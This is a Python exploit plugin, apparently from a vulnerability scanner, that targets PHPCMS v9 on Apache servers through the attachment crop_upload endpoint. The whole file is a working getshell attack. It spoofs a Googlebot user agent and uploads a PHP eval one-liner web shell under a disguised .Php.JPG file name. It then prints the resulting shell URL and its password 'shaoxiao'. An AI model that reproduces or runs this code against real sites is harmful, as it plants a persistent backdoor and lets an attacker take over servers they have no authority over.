##############################PHPCMS v9 Getshell（Apache） ###########################
#参考http://www.wooyun.org/bugs/wooyun-2013-019299
class phpcmsv9getshell:
    support = [PHPCMS]
    
    def isSupport(self,servie):
        if servie in self.support:
            return True
        else:
            return False
        
    def scan(self,arg,servie):
        if not self.isSupport(servie):
            return None
        req = do_URLLIB2_request(arg)
        html = None
        if req:
            html = req.info()['Server']
            if 'pache' in html:
                self.dir(arg)
    def dir(self,arg):#创建个文件夹
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
        data = 'i am just test'
        url = arg.split('//')[1]
        urlsite = '/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=shaoxiao.jpg'
        req = do_HTTPLIB_request(url,site=urlsite,params=data,head=headers)
        html = None
        if req:
            html = req.read()
            if html:
                self.getshell(arg)            
    def getshell(self,arg):
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
        data = "test<?php @eval($_POST[\''.'shaoxiao'.'\']);?>'"
        url = arg.split('//')[1]
        urlsite = '/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://www.sttc.cn/uploadfile/1222.thumb_.Php.JPG%20%20%20%20%20%20%20Php'
        html = None
        code = None
        req = do_HTTPLIB_request(url,urlsite,params=data,head=headers)
        if req:
            html = req.read()
            code = req.status
        if code == 200 and html:
            gets = re.compile('http://(.*?)\.Php\.JPG\s')
            get = gets.findall(html)
            if get:
                security_hole('Shell: http://'+get[0]+'.Php.JPG%20%20%20%20%20%20%20Php  Pass:shaoxiao')